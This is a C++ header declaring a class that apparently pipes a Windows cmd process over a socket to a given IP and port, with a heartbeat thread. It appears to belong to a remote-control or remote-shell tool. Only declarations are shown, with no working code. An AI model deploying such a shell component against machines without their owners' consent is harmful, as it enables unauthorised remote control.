#pragma once
#include "IMyCommand.h"
#include "ClientSocket.h"
class CShellCommand :
    public IMyCommand
{
public:
    CShellCommand(char* szIP, int nPort);
    virtual ~CShellCommand();
    virtual void OnRecv(char* pBuffer, int nSize);
    virtual void OnSend(char* pBuffer, int nSize);
    virtual void Execute();
    virtual void OnClose();


    bool InitPie();
    bool ExecuteCommand(char* pBuffer);
    static unsigned __stdcall ReadPieProc(LPVOID lpParam);
    static unsigned __stdcall CShellCommand::HeratProc(LPVOID lpParam);

private:
    CClientSocket   m_ClientSocket;
    char*           m_szIp;
    int             m_nPort;
    HANDLE          m_hEvent; //线程池同步用

                            //管道用的句柄
    HANDLE m_hCMDReadPipe;
    HANDLE m_hCMDWritePipe;
    HANDLE m_hMyReadPipe;
    HANDLE m_hMyWritePipe;
    PROCESS_INFORMATION pi;
    HANDLE m_ReadPieThread; 

    HANDLE m_ProcessHandl; //cmd进程句柄

    HANDLE      m_HeratThread;
    DWORD       m_dwLastTime;
};

